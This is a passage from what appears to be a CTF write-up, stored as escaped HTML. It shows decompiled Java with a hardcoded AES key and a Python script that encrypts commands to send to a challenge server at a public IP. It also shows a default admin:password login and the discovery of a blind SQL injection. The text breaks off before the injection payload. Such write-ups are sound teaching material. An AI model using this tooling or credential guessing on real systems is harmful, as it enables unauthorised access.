class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n                \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earray\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earray2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n                \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                    \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earray3\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n                    \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earray4\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003earray3\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earray3\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earray\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003einstance\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                        \u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003einit\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                            \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                            \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                                \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n                                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetBoolean\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n                                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n                                \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estring\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;error\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                                \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n                                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n                                \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"n\"\u003eex\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Unknown\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n                                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n                            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003erest\u003c/span\u003e \u003cspan class=\"n\"\u003esnipped\u003c/span\u003e \u003cspan class=\"n\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI quickly wrote a encryption/decryption routine in python to help me send requests to the server. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esys\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eCrypto.Cipher\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003epad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eunpad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])]\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eKEY\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x38\\x4f\\x2e\\x6a\\x1a\\x05\\xe5\\x22\\x3b\\x80\\xe9\\x60\\xa0\\xa6\\x50\\x74\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\n\n\n\u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;A\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eKEY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;A\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;base64\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eresp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;d\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;base64\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003eunpad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eKEY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eresp\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eresp\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e:]))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt basically takes the first command line parameter, encrypts it and sends the request to the server. Then it decrypts the response and prints it.\u003c/p\u003e\n\n\u003cp\u003eUsing it to tamper with the server, I identified \u003ccode\u003eadmin:password\u003c/code\u003e as a valid user/pass combination\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files# python remote.py \u0026#39;{\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;, \u0026quot;password\u0026quot;:\u0026quot;admin\u0026quot;, \u0026quot;cmd\u0026quot;:\u0026quot;getTemp\u0026quot;}\u0026#39;\n{\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Invalid username or password\u0026quot;}\nroot@pwnbox16:~/files# python remote.py \u0026#39;{\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;, \u0026quot;password\u0026quot;:\u0026quot;password\u0026quot;, \u0026quot;cmd\u0026quot;:\u0026quot;getTemp\u0026quot;}\u0026#39;\n{\u0026quot;temperature\u0026quot;: 73, \u0026quot;success\u0026quot;: true}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlaying around with it a little more, I also identified a blind SQLi in the username.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files# python remote.py 